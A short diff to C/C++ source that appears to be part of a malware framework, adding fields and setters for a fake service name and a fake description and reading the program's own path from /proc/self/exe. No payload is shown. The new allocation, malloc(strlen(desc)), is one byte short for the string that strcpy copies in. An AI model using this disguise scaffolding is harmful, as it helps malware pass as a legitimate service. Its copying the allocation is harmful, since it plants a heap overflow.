@@ -68,6 +68,7 @@ typedef void (*function)(int);
 struct  c_malware_stats__t{
 	char   	     name[PAMAX];
 	char	     fakename[155];
+	char*	     fakedescription = NULL;
 
 	size_t       size;
 };
@@ -89,7 +90,7 @@ void cvinit(int argc=0x00, char** argv=NULL){
 	MALWARE=&Current;
 
 	stat(_argv__[0], &currentstat);
-	strncpy(Current.name, _argv__[0], 256);
+	readlink("/proc/self/exe", Current.name, PAMAX);
 	Current.size=currentstat.st_size;
 
 	return;
@@ -97,9 +98,22 @@ void cvinit(int argc=0x00, char** argv=NULL){
 void SetMalwareMode(int mode){
 	return;
 }
-void SetMalwareFakeName(const char* name){
+void SetMalwareFakeService(const char* name){
 	strncpy(Current.fakename, name, 155);
 }
+
+void SetMalwareFakeDescription(const char* desc){
+	if (Current.fakedescription){
+		free(Current.fakedescription);
+		Current.fakedescription=NULL;
+	}
+
+	Current.fakedescription=(char*)malloc(strlen(desc));
+	strcpy(Current.fakedescription, desc);
+}
+
 void cvexit(int x){
+	if (Current.fakedescription)
+		free(Current.fakedescription);
 	exit(x);
 }
